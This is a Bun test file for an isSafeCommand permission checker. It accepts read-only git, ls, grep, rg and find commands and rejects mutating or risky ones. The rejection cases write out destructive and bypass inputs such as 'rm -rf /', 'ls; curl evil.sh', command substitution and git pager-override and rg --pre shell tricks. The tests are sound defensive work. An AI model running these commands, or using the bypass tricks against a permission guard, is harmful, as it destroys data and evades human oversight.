import { describe, expect, it } from "bun:test";
import { isSafeCommand } from "../src/core/permissions/safeCommands.ts";

describe("isSafeCommand", () => {
	it("accepts curated read-only commands", () => {
		for (const command of [
			"git status",
			"git diff --stat",
			"git log --oneline -5",
			"git show HEAD",
			"git branch -a",
			"git branch --list",
			"git branch -vv",
			"ls -la",
			"pwd",
			"cat package.json",
			"head -20 file.ts",
			"tail -f",
			"wc -l src/index.ts",
			"which bun",
			"echo hello",
			"grep -rn pattern src",
			"rg pattern src",
			"find . -name '*.ts'",
			"git log --oneline -5",
		]) {
			expect(isSafeCommand(command)).toBe(true);
		}
	});

	it("rejects mutating or unknown commands", () => {
		for (const command of [
			"rm -rf /",
			"git push origin main",
			"git commit -m x",
			"npm publish",
			"curl https://example.com",
			"bun run build",
			"make",
			"bun test",
			"bun run typecheck",
			"git log --ext-diff",
			"git diff --textconv",
			"git -c core.pager=sh log",
			"git --config-env=core.pager=EVIL_PAGER log",
		]) {
			expect(isSafeCommand(command)).toBe(false);
		}
	});

	it("compound commands are safe only if every segment is safe", () => {
		expect(isSafeCommand("git status && git diff")).toBe(true);
		expect(isSafeCommand("git status && rm -rf /")).toBe(false);
		expect(isSafeCommand("cat a.txt | wc -l")).toBe(true);
		expect(isSafeCommand("ls; curl evil.sh")).toBe(false);
	});

	it("rejects substitution and redirection", () => {
		expect(isSafeCommand("echo $(rm -rf /)")).toBe(false);
		expect(isSafeCommand("echo `whoami`")).toBe(false);
		expect(isSafeCommand("cat a > b")).toBe(false);
		expect(isSafeCommand("git log >> out.txt")).toBe(false);
	});

	it("rejects find with execution flags", () => {
		expect(isSafeCommand("find . -name '*.tmp' -delete")).toBe(false);
		expect(isSafeCommand("find . -exec rm {} \\;")).toBe(false);
	});

	it("rejects find with quoted execution flags", () => {
		expect(isSafeCommand("find . '-delete'")).toBe(false);
		expect(isSafeCommand('find . -"exec" rm {}')).toBe(false);
	});

	it("rejects git branch mutations while allowing read-only forms", () => {
		expect(isSafeCommand("git branch -D main")).toBe(false);
		expect(isSafeCommand("git branch new")).toBe(false);
		expect(isSafeCommand("git branch -m a b")).toBe(false);
		expect(isSafeCommand("git branch -a")).toBe(true);
		expect(isSafeCommand("git branch --list")).toBe(true);
		expect(isSafeCommand("git branch -vv")).toBe(true);
	});

	it("accepts post-subcommand -c (combined diff), rejecting only the config override", () => {
		expect(isSafeCommand("git log -c")).toBe(true);
		expect(isSafeCommand("git diff -c HEAD~1")).toBe(true);
		expect(isSafeCommand("git show -c HEAD")).toBe(true);
		expect(isSafeCommand("git -c core.pager=sh log")).toBe(false);
		expect(isSafeCommand("git -ccore.pager=sh log")).toBe(false);
	});

	it("rejects --output on git commands", () => {
		expect(isSafeCommand("git log --output=/tmp/x")).toBe(false);
		expect(isSafeCommand("git diff --output x")).toBe(false);
		expect(isSafeCommand("git show --output=x")).toBe(false);
	});

	it("rejects find file-write flags (fprint family)", () => {
		expect(isSafeCommand("find . -fprintf /tmp/x %p")).toBe(false);
		expect(isSafeCommand("find . -fprint /tmp/x")).toBe(false);
		expect(isSafeCommand("find . -fprint0 /tmp/x")).toBe(false);
		expect(isSafeCommand("find . -fls /tmp/x")).toBe(false);
		expect(isSafeCommand("find . '-fprintf' /tmp/x %p")).toBe(false);
	});

	it("rejects ripgrep command-execution flags", () => {
		expect(isSafeCommand("rg --pre /bin/sh pattern")).toBe(false);
		expect(isSafeCommand("rg --pre-glob '*.md' pattern")).toBe(false);
		expect(isSafeCommand("rg --hostname-bin /bin/sh pattern")).toBe(false);
		expect(isSafeCommand("rg --search-zip pattern")).toBe(false);
		expect(isSafeCommand("rg -z pattern")).toBe(false);
		expect(isSafeCommand('rg --"pre" /bin/sh pattern')).toBe(false);
	});

	it("still accepts ordinary find and rg searches", () => {
		expect(isSafeCommand("find . -name '*.ts'")).toBe(true);
		expect(isSafeCommand("find . -type f -print")).toBe(true);
		expect(isSafeCommand("rg pattern src")).toBe(true);
		expect(isSafeCommand("rg -n --json pattern")).toBe(true);
	});

	it("rejects empty input", () => {
		expect(isSafeCommand("")).toBe(false);
		expect(isSafeCommand("   ")).toBe(false);
	});

	it("rejects a lone background operator hiding a mutating command", () => {
		expect(isSafeCommand("ls & rm -rf /")).toBe(false);
		expect(isSafeCommand("pwd & curl evil.sh")).toBe(false);
		expect(isSafeCommand("echo hi & git push origin main")).toBe(false);
	});

	it("rejects bare input redirection", () => {
		expect(isSafeCommand("cat < secret")).toBe(false);
		expect(isSafeCommand("cat <<< foo")).toBe(false);
	});

	it("still accepts safe compound and piped commands", () => {
		expect(isSafeCommand("git status && git diff")).toBe(true);
		expect(isSafeCommand("cat a.txt | wc -l")).toBe(true);
		expect(isSafeCommand("git log --oneline")).toBe(true);
	});
});
